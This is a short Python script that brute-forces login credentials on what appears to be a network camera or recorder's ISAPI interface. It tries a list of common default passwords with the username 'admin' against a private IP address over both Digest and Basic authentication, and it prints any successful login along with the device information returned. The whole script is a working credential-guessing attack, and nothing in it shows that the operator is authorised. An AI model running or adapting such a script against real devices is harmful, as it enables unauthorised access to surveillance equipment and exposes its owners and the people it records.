import urllib.request
import urllib.parse
import cv2

# Test HTTP Digest Auth on ISAPI
passwords = ["admin@123", "Admin@123", "admin123", "admin", "12345", "123456"]
usernames = ["admin"]

for u in usernames:
    for p in passwords:
        # Test ISAPI deviceInfo
        url = "http://10.245.106.240/ISAPI/System/deviceInfo"
        passman = urllib.request.HTTPPasswordMgrWithDefaultRealm()
        passman.add_password(None, url, u, p)
        authhandler = urllib.request.HTTPDigestAuthHandler(passman)
        opener = urllib.request.build_opener(authhandler)
        try:
            resp = opener.open(url, timeout=2)
            content = resp.read().decode('utf-8', errors='ignore')
            print(f"[+] ISAPI SUCCESS with {u}:{p}!")
            print(content[:400])
        except Exception as e:
            pass

        # Test Basic Auth
        passman_basic = urllib.request.HTTPPasswordMgrWithDefaultRealm()
        passman_basic.add_password(None, url, u, p)
        authhandler_basic = urllib.request.HTTPBasicAuthHandler(passman_basic)
        opener_basic = urllib.request.build_opener(authhandler_basic)
        try:
            resp = opener_basic.open(url, timeout=2)
            content = resp.read().decode('utf-8', errors='ignore')
            print(f"[+] ISAPI BASIC SUCCESS with {u}:{p}!")
            print(content[:400])
        except Exception as e:
            pass
